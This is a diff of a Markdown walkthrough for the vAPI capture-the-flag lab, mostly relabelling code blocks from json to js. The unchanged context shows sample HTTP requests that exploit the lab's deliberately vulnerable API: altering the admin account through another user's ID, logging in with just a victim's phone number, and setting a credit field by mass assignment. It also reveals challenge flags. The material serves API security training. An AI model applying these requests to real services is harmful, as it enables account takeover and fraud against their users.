@@ -10,7 +10,7 @@
 
 Let's create a dummy account:
 
-```json
+```js
 Request => "POST http://{{host}}/vapi/api1/user"
 {
     "username": "testuser",
@@ -31,7 +31,7 @@ Response =>
 Our user's ID is `30`. 
 Let's retrieve our user's details:
 
-```json
+```js
 Request => "GET http://{{host}}/vapi/api1/user/30"
 
 Response =>
@@ -50,7 +50,7 @@ We have flag 1: `flag{api1_d0cd9be2324cc237235b}`
 
 Simillarly, we can also update other user's details. Let's change the account details of the admin account. 
 
-```json
+```js
 Request => "PUT http://{{host}}/vapi/api1/user/1"
 {
     "username":"pwned",
@@ -83,7 +83,7 @@ Found valid creds:
 
 
 After logging in, we can check user details by making a request like:
-```json
+```js
 Req => "GET http://{{host}}/vapi/api2/user/details"
 ```
 
@@ -128,7 +128,7 @@ Flag 3: `flag{api3_0bad677bfc504c75ff72}`
 
 Let's say that we somehow got the phone number of one of the users. The phone number of that victim user is `8000000535`. Send the phone number to the login endpoint.
 
-```json
+```js
 Request => "POST http://{{host}}/vapi/api4/login"
 {
     "mobileno":"8000000535"
@@ -161,7 +161,7 @@ We get flag4: `flag{api4_ce696239323ea5b2d015}`
 
 First, we create a user account by doing a POST request:
 
-```json
+```js
 Request => "POST http://{{host}}/vapi/api5/user"
 {
     "username":"user",
@@ -181,7 +181,7 @@ Response =>
 ```
 To retrieve the user's account details, we do the following request:
 
-```json
+```js
 Request => "GET http://{{host}}/vapi/api5/user/2"
 Response =>
 {
@@ -210,7 +210,7 @@ We get all the users' details along with the admin user's account details which 
 
 We start by creating a user account:
 
-```json
+```js
 Request => "POST http://{{host}}/vapi/api6/user"
 {
     "name":"name123",
@@ -227,7 +227,7 @@ Response =>
 
 We can retrieve our user's account details with the following request:
 
-```json
+```js
 Request => "GET http://{{host}}/vapi/api6/user/me"
 Response =>
 {
@@ -242,7 +242,7 @@ There is an interesting property called `credit` whose value is 0. What if we co
 
 Let's create another user and forcefully set the credit value to 9999999.
 
-```json
+```js
 Request => "POST http://{{host}}/vapi/api6/user"
 {
     "name":"newname",
@@ -364,7 +364,7 @@ Flag 9: `flag{api9_81e306bdd20a7734e244}`
 ## API 10 [Insufficient logging and monitoring]
 > Nothing has been logged or monitored , You caught us :( !
 
-There isn't anything to exploit
+This is a design flaw, and the attacker has no role on exploitation part.
 
 ![](https://raw.githubusercontent.com/xplo1t-sec/CTF/master/challenges/vAPI/images/flag10.png)
 
